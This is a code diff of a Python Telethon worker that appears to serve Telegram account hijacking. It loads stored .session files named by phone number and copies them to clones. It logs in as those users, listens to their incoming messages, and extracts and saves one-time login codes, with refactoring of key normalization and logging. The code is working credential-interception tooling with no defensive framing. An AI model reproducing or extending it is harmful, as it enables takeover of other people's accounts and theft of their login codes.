@@ -392,9 +392,10 @@ async def forward_handler(event, client_name):
 
     otp_code = otp_list[0]
 
-    # ensure normalized key
-    save_data(client_name, otp=otp_code)
-    print("[OTP FOUND]", client_name, otp_code)
+    key = normalize_phone_key(client_name)
+    save_data(key, otp=otp_code)
+
+    print("[OTP FOUND]", key, otp_code)
 
 
 async def worker_main():
@@ -404,18 +405,17 @@ async def worker_main():
     while True:
         try:
             for fn in os.listdir(SESSION_DIR):
-                # we only care about finalized .session files
                 if not fn.endswith(".session"):
                     continue
                 if ".pending" in fn:
                     continue
 
-                base = fn[:-8].strip()
+                base = normalize_phone_key(fn[:-8])
                 if base in clients:
                     continue
 
                 real_session = os.path.join(SESSION_DIR, fn)
-                # copy to temp to avoid locking the real DB
+
                 ts = int(time.time() * 1000)
                 temp_session = os.path.join(tempfile.gettempdir(), f"{base}_clone_{ts}.session")
                 try:
@@ -424,11 +424,10 @@ async def worker_main():
                     print(f"[WORKER] failed to copy session {real_session} -> {temp_session}: {e}")
                     continue
 
-                print(f"[WORKER] load clone session: {temp_session}")
+                print(f"[WORKER] load clone session: {temp_session}  KEY={base}")
 
                 client = TelegramClient(temp_session, api_id, api_hash)
 
-                # try connect with small retries
                 connected = False
                 for attempt in range(5):
                     try:
@@ -440,10 +439,8 @@ async def worker_main():
                         await asyncio.sleep(0.5)
 
                 if not connected:
-                    try:
-                        await client.disconnect()
-                    except Exception:
-                        pass
+                    try: await client.disconnect()
+                    except: pass
                     continue
 
                 try:
@@ -452,25 +449,23 @@ async def worker_main():
                         await client.disconnect()
                         continue
                 except Exception as e:
-                    print(f"[WORKER] is_user_authorized check failed for {base}: {e}")
-                    try:
-                        await client.disconnect()
-                    except Exception:
-                        pass
+                    print(f"[WORKER] is_user_authorized check failed {base}: {e}")
+                    try: await client.disconnect()
+                    except: pass
                     continue
 
                 try:
                     me = await client.get_me()
-                    print(f"[WORKER] connected as {me.id} ({getattr(me,'username','')})")
+                    print(f"[WORKER] connected as {me.id} ({getattr(me,'username','')}) for KEY={base}")
                 except Exception as e:
-                    print(f"[WORKER] get_me failed for {base}: {e}")
+                    print(f"[WORKER] get_me failed {base}: {e}")
 
                 @client.on(events.NewMessage(incoming=True))
-                async def _handler(event, fn=base):
+                async def _handler(event, phone_key=base):
                     try:
-                        await forward_handler(event, fn)
+                        await forward_handler(event, phone_key)
                     except Exception as e:
-                        print(f"[WORKER] handler error {fn}: {e}")
+                        print(f"[WORKER] handler error {phone_key}: {e}")
 
                 task = asyncio.create_task(client.run_until_disconnected())
                 clients[base] = task
@@ -480,16 +475,3 @@ async def worker_main():
 
         await asyncio.sleep(0.5)
 
-
-def start_worker_thread():
-    t = threading.Thread(target=lambda: asyncio.run(worker_main()), daemon=True)
-    t.start()
-
-
-# ===== START WORKER =====
-start_worker_thread()
-
-
-# ===== MAIN =====
-if __name__ == "__main__":
-    app.run(host="0.0.0.0", port=8080, debug=True)
